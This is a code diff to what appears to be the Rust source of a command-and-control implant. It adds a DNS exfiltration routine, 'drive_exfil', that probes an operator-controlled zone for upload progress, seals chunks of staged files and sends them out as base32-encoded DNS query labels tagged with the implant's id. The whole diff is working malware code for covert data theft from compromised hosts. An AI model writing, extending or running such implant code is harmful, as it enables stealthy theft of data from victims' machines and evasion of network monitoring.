@@ -46,6 +46,15 @@ use crate::wire::{ChannelInput, Frame, FrameKind, StagedChunk, TaskRequest, Task
 /// the label ceiling.
 const CHUNK_BYTES: usize = 39;
 
+/// The upload arm's per-run cap over this carrier (the server's DNS-arm
+/// twin): a run past it needs a stream carriage, so the drive skips it and
+/// the cycle guard owns the outcome.
+const DNS_STREAM_BYTES: usize = 1024 * 1024;
+
+/// One sealed blob's plaintext budget: a single ExfilChunk frame whose
+/// sealed body stays inside the server's per-stream upload cap.
+const EXFIL_BLOB_BYTES: usize = 3800;
+
 /// The poll answer's kind bytes: the TXT payload is base32 of
 /// kind || message, so a frame names itself without a parse-guess.
 const TASK_KIND: u8 = b't';
@@ -65,6 +74,7 @@ pub struct Dns {
 }
 
 /// The baked key split for the DNS carriage's raw-body sealing.
+#[derive(Clone)]
 struct SealedKey {
     key_id: [u8; 16],
     key: [u8; 32],
@@ -279,6 +289,10 @@ impl Dns {
         // own query loop, and a transfer it completes queues its result for
         // this cycle's upstream drain below.
         self.drive_staged(session)?;
+        // The upload arm's own drive (ADR-010): each pending run probes its
+        // seam and carries one sealed blob, x./u. -- before the batch drain
+        // so a run the transfer completes lands with this cycle's results.
+        self.drive_exfil(session)?;
         let batch = session.outbox.batch();
         for frame in &batch {
             match frame.kind() {
@@ -317,6 +331,7 @@ impl Dns {
         }
         session.outbox.batch_crossed(batch.len());
         session.staged_cycle_end();
+        session.exfil_cycle_end();
         self.flush_pending(session)
     }
 
@@ -402,6 +417,74 @@ impl Dns {
                 let done = chunk.terminal;
                 session.accept_staged_chunk(&chunk);
                 if done {
+                    break;
+                }
+            }
+        }
+        Ok(())
+    }
+
+    /// The upload arm over the datagram grammar (ADR-010): each pending run
+    /// probes its seam -- x.&lt;task&gt;.&lt;name's sha128&gt;.&lt;implant&gt;,
+    /// answered with the decimal held count -- then carries one sealed blob
+    /// from the reported seam as a u. upload stream (e.-shaped: in-order
+    /// chunks, a fresh client-chosen stream id per blob). One blob per run
+    /// per cycle, the query-rate cadence; a lost blob never moves the seam,
+    /// so the next probe re-serves it -- placement is idempotent
+    /// server-side. Sealed-only by the arm's own decision: a bake without a
+    /// key carries no exfil over DNS (the cycle guard retires the run), and
+    /// a run past the DNS arm's cap waits for a stream carriage.
+    fn drive_exfil(&mut self, session: &mut Session) -> Result<(), ContactError> {
+        let Some(seal) = self.seal.clone() else {
+            return Ok(());
+        };
+        for stream in session.exfil_streams() {
+            if stream.total > DNS_STREAM_BYTES {
+                continue;
+            }
+            let mut name_sha = [0u8; 16];
+            name_sha.copy_from_slice(&Sha256::digest(stream.name.as_bytes())[..16]);
+            let probe = format!(
+                "x.{}.{}.{}.{}",
+                base32_encode(stream.task.as_bytes()),
+                base32_encode(&name_sha),
+                base32_encode(session.implant_id.as_bytes()),
+                self.zone,
+            );
+            let Ok(Some(answer)) = query(&self.exchange, &probe) else {
+                continue; // unanswered: the cycle's no-progress guard owns it
+            };
+            let text = String::from_utf8_lossy(&answer).into_owned();
+            let Ok(held) = text.trim().parse::<u64>() else {
+                continue;
+            };
+            session.exfil_progress(&stream.task, &stream.name, held);
+            let Some(blob) = session.exfil_blob(&stream.task, &stream.name, EXFIL_BLOB_BYTES)
+            else {
+                continue; // the report retired the run: it landed
+            };
+            let sealed =
+                envelope::seal_raw_body(&blob, &seal.key_id, &seal.key, envelope::DNS_EXFIL_AAD);
+            let stream_id: [u8; 8] = rand::thread_rng().gen();
+            for (index, window) in sealed.chunks(CHUNK_BYTES).enumerate() {
+                let terminal = (index + 1) * CHUNK_BYTES >= sealed.len();
+                let name = format!(
+                    "u.{}.{}.{}.{}.{}.{}",
+                    base32_encode(&stream_id),
+                    index,
+                    if terminal { "t" } else { "m" },
+                    if window.is_empty() {
+                        "e".into()
+                    } else {
+                        base32_encode(window)
+                    },
+                    base32_encode(session.implant_id.as_bytes()),
+                    self.zone,
+                );
+                // An answer or its absence means nothing on the upload path
+                // -- the next cycle's seam probe is the arbiter -- so a
+                // failed query ends the blob for this cycle, not the run.
+                if query(&self.exchange, &name).is_err() {
                     break;
                 }
             }
